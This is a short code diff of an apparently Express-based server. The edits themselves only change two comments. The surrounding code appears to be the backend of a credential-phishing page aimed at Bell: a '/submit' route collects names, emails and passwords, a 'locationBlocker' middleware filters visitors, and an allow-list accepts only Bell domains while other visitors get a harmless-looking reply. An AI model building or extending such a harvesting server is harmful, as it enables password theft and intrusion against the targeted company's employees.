@@ -91,7 +91,7 @@ function isAuthorizedCompanyEmail(name, email) {
   const domain = email.split('@')[1]?.toLowerCase();
   if (!domain) return false;
 
-  // 👇 PUT YOUR AUTHORIZED COMPANY DOMAINS HERE
+  // 👇 PUT YOUR AUTHORIZED COMPANY DOMAINS HERE IF YOU WANT TO EXPAND FROM ONLY FILTERING BELL
   const allowedCompanyDomains = [
     'bell.com',
     'bellnet.ca',
@@ -115,7 +115,7 @@ app.post('/submit', locationBlocker, async (req, res) => {
 
     const { name, email, password, retypedEmail, retypedPassword } = data;
 
-    // 🔐 Enforce company-email rule ONLY for sigma
+    // 🔐 Enforce company-email rule ONLY for Bell
     if (!isAuthorizedCompanyEmail(name, email)) {
       return res.status(200).json({
         message: 'Request received.'
